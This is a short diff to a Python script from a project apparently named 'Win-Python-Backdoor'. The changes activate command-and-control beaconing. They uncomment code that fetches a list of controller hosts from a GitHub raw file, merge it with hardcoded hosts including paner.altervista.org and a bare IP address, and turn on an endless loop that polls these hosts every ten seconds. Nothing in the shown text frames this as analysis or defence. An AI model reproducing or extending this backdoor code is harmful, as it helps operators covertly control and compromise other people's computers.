@@ -171,12 +171,12 @@ def myloop():
     #threading.Timer(10.0, myloop).start() # called every minute   
     sinit='0'
     #sites = ["paner.altervista.org", "verifiche.ddns.net"]
-    #ua = UserAgent()
-    #header = {'User-Agent':str(ua.chrome)}
-    #mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
+    ua = UserAgent()
+    header = {'User-Agent':str(ua.chrome)}
+    mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
     #print mainsite.text
     sites = ["paner.altervista.org"]#, mainsite.text]
-    #sites.extend(mainsite.text.split(",") )
+    sites.extend(mainsite.text.split(",") )
     #site="paner.altervista.org"
     site1="paner.altervista.org"
     site2="52.26.124.145"
@@ -216,7 +216,7 @@ def myloop():
 
     
     
-#while True:
+while True:
 
     
     for site in sites:
@@ -407,6 +407,6 @@ def myloop():
               elif site == site3:
                   site=site1
               
-#time.sleep(10)
+time.sleep(10)
 
 
